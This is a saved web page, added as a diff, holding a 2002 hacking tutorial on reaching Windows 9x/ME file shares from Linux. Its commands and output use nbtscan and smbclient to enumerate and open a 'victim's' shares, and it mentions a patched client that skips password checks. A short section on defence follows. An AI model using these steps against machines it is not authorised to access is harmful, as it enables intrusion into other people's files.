@@ -1,0 +1,310 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0064)http://www.arson-network.com/index.php?class=tutorial&subargs=20 -->
+<XHTML><HTML><HEAD><TITLE>Using Netbios Against 9x/Me from Linux : BrainRawt :: Arson Network v3.0</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=windows-1252"><LINK 
+href="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/config.css" 
+type=text/css rel=stylesheet><LINK href="/images/favico.ico" type=image/x-icon 
+rel="shortcut icon">
+<META 
+content="Arson, Arson-Network, Arson Network, Security, Gen Computers, C/C++, PHP, HTML, &#10;JavaScript, Misc &#10;(Other), Perl, Unix, Linux, C++ Builder, Java, Graphics, DOS, SQL, Hardware, Encryption, &#10;CGI, C#, Python, BSD, IRC, XML, Python, tutorials" 
+name=keywords>
+<META 
+content="Arson-Network.org is a Computer Security/Programming &#10;site with 380+ user submitted tutorials. We have tutorials on almost every computer &#10;related subject with the tutorial database growing everyday" 
+name=description>
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
+<BODY bottomMargin=0 leftMargin=0 topMargin=0 rightMargin=0>
+<TABLE height="100%" cellSpacing=0 cellPadding=0 width="100%">
+  <TBODY>
+  <TR><!-- LAST EDIT BY: Fazer -->
+    <TD vAlign=top bgColor=black colSpan=2 height=60>
+      <TABLE width="100%">
+        <TBODY>
+        <TR>
+          <TD><A href="http://www.arson-network.com/index.php"><IMG 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/anlogo.jpg" 
+            border=0></A> </TD>
+          <TD>
+            <CENTER>
+            <DIV align=center><A 
+            href="http://www.digitalcybersoft.com/ProxyList/" 
+            target='\"_blank\"'><IMG alt="Proxy List" 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/dcsbanner.gif" 
+            border=0></A></DIV><A 
+            href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=advertisement"><SMALL><FONT 
+            color=white>ADVERTISEMENT INFO</FONT></SMALL></A> 
+        </CENTER></TD></TR></TBODY></TABLE></TD></TR>
+  <TR>
+    <TD style="BORDER-BOTTOM: black 1px solid" bgColor=#ff9933 height=80><IMG 
+      alt="The Online Learning Resource" 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/anbanner.jpg"></TD>
+    <TD 
+    style="PADDING-RIGHT: 5px; BACKGROUND-IMAGE: url(/images/ansearch.gif); BORDER-BOTTOM: black 1px solid; TEXT-ALIGN: right" 
+    bgColor=#ff9933>
+      <FORM action=index.php method=post><INPUT type=hidden value=search 
+      name=class> <BR><INPUT class=orange size=15 name=args> <BR><INPUT 
+      class=orange type=image 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/searchbutton.gif"></FORM></TD></TR>
+  <TR>
+    <TD height=1><IMG 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/anmenu.gif" 
+      useMap=#Map border=0></TD>
+    <TD bgColor=#660000></TD></TR>
+  <TR>
+    <TD style="PADDING-RIGHT: 15px; PADDING-LEFT: 15px" vAlign=top><!-- BEGIN PAGE --><BR><A 
+      href="http://www.arson-network.com/print.php?tid=20"><IMG 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/printer.gif" 
+      border=0> Print Tutorial</A><BR>
+      <P><SPAN class=tutorial-title><B>Using Netbios Against 9x/Me from 
+      Linux</B></SPAN> 
+      <P>By: <A class=tutorial-author 
+      href="http://www.arson-network.com/index.php?class=userops&amp;args=profile&amp;subargs=BrainRawt">BrainRawt</A> 
+
+      <P><SPAN class=tutorial-body>Hacking Windows 9x/ME Netbios With Linux 
+      <BR>Author: BrainRawt <BR>Email: brainrawt@hotmail.com <BR>Site: 
+      http://www.haxworx.com <BR><BR>Updated on 5-11-02<BR><BR>REQUIRED 
+      TOOLS:<BR>root access (for /etc/hosts modification)<BR>nbtscan (find it at 
+      www.freshmeat.net)<BR>samba (should be on your linux distrobution 
+      cds)<BR><BR><BR><BR>/* We will start out by checking the victims computer 
+      for file and <BR>print sharing with nbtscan. 
+      */<BR><BR><BR>[brainrawt@linuxusers.com nbtscan]$ ./nbtscan 
+      192.168.0.1<BR>Doing NBT name scan on 192.168.0.1<BR><BR>
+      <TABLE>
+        <TBODY>
+        <TR>
+          <TD style="BACKGROUND-COLOR: #dddddd" ;><SPAN 
+            class=tutorial-code><FONT face=courier color=blue><PRE><BR>
+ IP address       NetBIOS Name     Server    User             MAC address<BR>
+ ------------------------------------------------------------------------------<BR>
+ 192.168.0.1      winbox           &lt;server&gt;  BRAINRAWT        00-02-e3-0a-17-40<BR>
+</PRE></FONT></SPAN></TD></TR></TBODY></TABLE><BR><BR>[brainrawt@linuxusers.com 
+      nbtscan]$<BR><BR><BR>/* We now know that our victim has file and print 
+      sharing enabled. */<BR><BR><BR>/* Lets add our victims netbios name and ip 
+      address to our /etc/hosts file */<BR><BR>[root@linuxusers.com brainrawt]# 
+      echo 192.168.0.1 winbox &gt;&gt; /etc/hosts<BR><BR><BR>/* We now have 
+      "winbox" in our /etc/hosts file. Lets move on to smbclient. */<BR><BR>/* 
+      Win9x/ME netbios only sees the 1st byte of the passwd at a lower level 
+      format.<BR><BR>If you are able to modify the "client.c" file of smbclient 
+      before you compile it <BR>then you can bypass the password protected 
+      win9x/ME boxes. :) NOTE: There is a<BR>patch for client.c floating around 
+      on the internet. */<BR><BR>/* Its time we check out our victim and see 
+      what they have to offer. Sometimes <BR>we even get write access. :) 
+      */<BR><BR>[brainrawt@linuxusers.com brainrawt]$ smbclient -L 
+      winbox<BR><BR>Password: &lt;-- no passwd needed. My smbclient is patched. 
+      :)<BR><BR>
+      <TABLE>
+        <TBODY>
+        <TR>
+          <TD style="BACKGROUND-COLOR: #dddddd" ;><SPAN 
+            class=tutorial-code><FONT face=courier color=blue><PRE><BR>
+        Sharename      Type      Comment<BR>
+        ---------      ----      -------<BR>
+        C              Disk      All My Shit<BR>
+        MP3S           Disk      MP3S<BR>
+        PR0N           Disk      PR0N0<BR>
+<BR>
+        Server               Comment<BR>
+        ---------            -------<BR>
+        WINBOX<BR>
+<BR>
+        Workgroup            Master<BR>
+        ---------            -------<BR>
+        WINUSERS             WINBOX<BR>
+</PRE></FONT></SPAN></TD></TR></TBODY></TABLE><BR><BR>[brainrawt@linuxusers.com 
+      brainrawt]$<BR><BR><BR><BR><BR>/* As you can see above. Our victim is 
+      sharing "c, mp3s, and pr0n". */<BR><BR>/* Now its time we make a 
+      connection to one of those shares and look around. 
+      */<BR><BR>[brainrawt@linuxusers.com brainrawt]$ smbclient 
+      //winbox/c<BR><BR>Password: &lt;-- no passwd needed. My smbclient is 
+      patched. :)<BR>smb&gt; &lt;-- congrats!!!! You have access. type "help" 
+      for help on the 
+      smbclient<BR>commands.<BR><BR><BR>-------------------------------------------------<BR>Protecting 
+      Oneself Against this netbios 
+      attack<BR>-------------------------------------------------<BR><BR>1. If 
+      you dont need file and print sharing then disable it by removing 
+      the<BR>Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;check marks 
+      from "File and Print Sharing" in c:control-panelnetwork.<BR><BR>2 If you 
+      are on a network and have to have File and Print Sharing 
+      Enabled<BR>Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;then i 
+      suggest that you get a firewall and filter netbios allowing 
+      only<BR>Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;Â&nbsp;your 
+      internal network to connect.<BR><BR>You can get the "BlackIce" firewall 
+      from "www.networkice.com".<BR><BR>3. NOTE: Always use passwords on shared 
+      resources.<BR><BR><BR><BR>----------------------------------------------------------------<BR>Which 
+      looks better? Blackhat or White? You decide. - BrainRawt<BR><BR><I>This 
+      tutorial was last updated on 10-9-02.</I></SPAN> <BR><BR>
+      <HR 
+      style="BORDER-LEFT-COLOR: #000000; BORDER-BOTTOM-COLOR: #000000; WIDTH: 100%; BORDER-TOP-STYLE: dotted; BORDER-TOP-COLOR: #000000; BORDER-RIGHT-STYLE: dotted; BORDER-LEFT-STYLE: dotted; HEIGHT: 2px; BORDER-RIGHT-COLOR: #000000; BORDER-BOTTOM-STYLE: dotted">
+
+      <TABLE width="90%" border=0>
+        <TBODY>
+        <TR>
+          <TD vAlign=top width="40%"><B>Latest Review:</B><BR>There have been 
+            no reviews.</TD></TR>
+        <TR>
+          <TD colSpan=5><B>No Votes Yet</B></TD></TR></TBODY></TABLE><BR><BR>Discuss 
+      this tutorial and other things on our <A 
+      href="http://www.arson-network.com/forums">forums</A>.
+      <P>&nbsp;&nbsp; 
+      <CENTER><A class=spdr 
+      href="http://www.arson-network.com/index.php">Home</A> | <A class=spdr 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about">About 
+      Arson</A> | <A class=spdr 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources">Resources</A> 
+      | <A class=spdr href="http://www.arson-network.org/forums">Forums</A> | <A 
+      class=spdr 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=contact">Contact</A><BR><SPAN 
+      style="FONT-SIZE: 8pt; COLOR: #666666"><B>About Arson:</B> <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=help">Help 
+      Out</A> | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=gear">Arson 
+      Gear</A> | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=irc">IRC</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=stats">Stats</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=staff">Staff</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=contributors">Contributors</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=advertise">Advertising</A><BR><B>Resources:</B> 
+      <A class=copy 
+      href="http://www.arson-network.com/index.php?class=tutorial">Tutorials</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources&amp;subargs=links">Links</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources#downloads">Downloads</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources#challenges">Challenges</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources#quizzes">Quizzes</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources&amp;subargs=ebooks">eBooks</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources&amp;subargs=humor">Humor</A> 
+      | <A class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources&amp;subargs=affiliates">Affiliates</A> 
+
+      <P></SPAN>
+      <P>
+      <P>&nbsp;&nbsp;<SPAN class=copy> ©2002-2005 Arson-Network.com | <A 
+      class=copy 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=legal">Legal 
+      Disclaimer</A> </SPAN></CENTER>
+      <P>&nbsp; <!-- END PAGE --></P></TD>
+    <TD 
+    style="PADDING-RIGHT: 10px; PADDING-LEFT: 10px; PADDING-BOTTOM: 10px; BORDER-LEFT: black 1px solid; COLOR: #ff9933; PADDING-TOP: 10px; TEXT-ALIGN: right" 
+    vAlign=top width=120 bgColor=#660000>
+      <FORM action=index.php method=post><IMG 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/members.gif"> 
+      <INPUT class=orange size=15 name=username> <BR><INPUT class=orange 
+      type=password size=15 name=password> <BR><INPUT type=image 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/loginbutton.gif"> 
+      </FORM><A class=orange 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=userops&amp;subargs=canonize">Register</A><BR>
+      <TABLE cellSpacing=0 cellPadding=0>
+        <TBODY>
+        <TR>
+          <TD vAlign=top><A class=right-blend 
+            href="http://www.arson-network.com/index.php?class=tutorial"><IMG 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/mtutorials.gif" 
+            border=0></A></TD></TR>
+        <TR>
+          <TD vAlign=top><A 
+            href="http://www.arson-network.com/index.php?class=display&amp;args=members"><IMG 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/mmembers.gif" 
+            border=0></A></TD></TR>
+        <TR>
+          <TD vAlign=top><A 
+            href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=help"><IMG 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/mhelpout.gif" 
+            border=0></A></TD></TR>
+        <TR>
+          <TD vAlign=top><A 
+            href="http://www.arson-network.com/index.php?class=display&amp;args=hrefs"><IMG 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/mlinks.gif" 
+            border=0></A></TD></TR>
+        <TR>
+          <TD vAlign=top><A 
+            href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=irc"><IMG 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/mchat.gif" 
+            border=0></A></TD></TR>
+        <TR>
+          <TD vAlign=top><A href="http://www.arson-network.com/forums"><IMG 
+            src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/mforums.gif" 
+            border=0></A></TD></TR></TBODY></TABLE>
+      <P><!-- &nbsp;&nbsp;<a 
+href="/index.php?class=display&args=anzyne" 
+class="orange">Join AnZyNe<br /> --><A 
+      class=orange 
+      href="http://www.arson-network.com/index.php?class=tutops&amp;args=submit"><B>Submit 
+      A Tutorial</B></A><BR><A class=orange 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=resources&amp;subargs=contribute">Why 
+      Contribute?</A><BR><A class=orange 
+      href='javascript:window.external.addFavorite("http://www.Arson-Network.com",%20"Arson%20Network")'>Add 
+      to Favorites</A><BR><A class=orange 
+      style="BEHAVIOR: url(#default#homepage)" 
+      onclick='setHomePage("http://www.Arson-Network.com")' 
+      href="http://www.arson-network.com/index.php?class=tutorial&amp;subargs=20#">Make 
+      Homepage</A> </SPAN>
+      <HR width=120 color=#660000 noShade SIZE=0>
+      <A class=orange 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=feed"><IMG 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/rss.gif" 
+      border=0></A><BR><BR><A class=orange 
+      href="http://www.arson-network.com/source">Arson3 Source</A><BR><A 
+      class=orange 
+      href="http://www.arson-network.com/index.php?class=display&amp;args=arson4">Arson4 
+      Dev</A>
+      <P class=loggedin><BR><SPAN class=orange><B>Browsers: 
+      </B>(9)</SPAN><BR><B><FONT color=#ffffff>203.193.*.*</FONT></B> 
+      <BR><B><FONT color=#ffffff>msn.com</FONT></B> <BR><B><FONT 
+      color=#ffffff>looksmart.com</FONT></B> <BR><B><FONT 
+      color=#ffffff>NMSU.Edu</FONT></B> <BR><B><FONT 
+      color=#aaaaaa>googlebot.com</FONT></B> <BR><B><FONT 
+      color=#aaaaaa>196.40.*.*</FONT></B> <BR><B><FONT 
+      color=#aaaaaa>nd.us</FONT></B> <BR><B><FONT 
+      color=#666666>uni-leipzig.de</FONT></B> <BR><B><FONT 
+      color=#666666>146.214.*.*</FONT></B> <BR><BR>Activity Key: <BR><FONT 
+      color=#ffffff><B>60</B> Seconds</FONT><BR><FONT color=#aaaaaa><B>240</B> 
+      Seconds</FONT><BR><FONT color=#666666><B>300</B> Seconds</FONT><BR><BR>
+      <SCRIPT type=text/javascript><!--
+google_ad_client = "pub-5763338863016072";
+google_ad_width = 125;
+google_ad_height = 125;
+google_ad_format = "125x125_as";
+google_ad_channel ="";
+google_color_border = "FF9933";
+google_color_bg = "660000";
+google_color_link = "FF9933";
+google_color_url = "FF9933";
+google_color_text = "FFFFFF";
+//--></SCRIPT>
+
+      <SCRIPT 
+      src="Using Netbios Against 9x-Me from Linux  BrainRawt  Arson Network v3_0_files/show_ads.js" 
+      type=text/javascript>
+</SCRIPT>
+      </SPAN></SPAN></P></TD></TR></TBODY></TABLE></XHTML><MAP name=Map><AREA 
+  shape=RECT coords=81,3,118,19 
+  href="http://www.arson-network.com/index.php"><AREA shape=RECT 
+  coords=137,3,209,18 
+  href="http://www.arson-network.com/index.php?class=display&amp;args=about"><AREA 
+  shape=RECT coords=228,2,291,18 
+  href="http://www.arson-network.com/index.php?class=display&amp;args=resources"><AREA 
+  shape=RECT coords=310,4,352,17 
+  href="http://www.arson-network.com/forums"><AREA shape=RECT 
+  coords=368,3,418,18 
+  href="http://www.arson-network.com/index.php?class=display&amp;args=contact"></MAP><MAP 
+name=Map2><AREA shape=RECT coords=9,9,219,79 
+  href="http://www.arson-network.com/index.php?class=tutorial"><AREA shape=RECT 
+  coords=10,80,219,149 
+  href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=help"><AREA 
+  shape=RECT coords=10,151,218,219 
+  href="http://www.arson-network.com/index.php?class=display&amp;args=about&amp;subargs=irc"><AREA 
+  shape=RECT coords=220,10,440,79 
+  href="http://www.arson-network.com/index.php?class=display&amp;args=members"><AREA 
+  shape=RECT coords=221,80,441,149 
+  href="http://www.arson-network.com/index.php?class=display&amp;args=resources&amp;subargs=affiliates"><AREA 
+  shape=RECT coords=221,152,441,220 
+href="http://www.arson-network.com/forums"></MAP>Arson3 Rendered in: 2.78157 
+Seconds<BR></BODY></HTML>
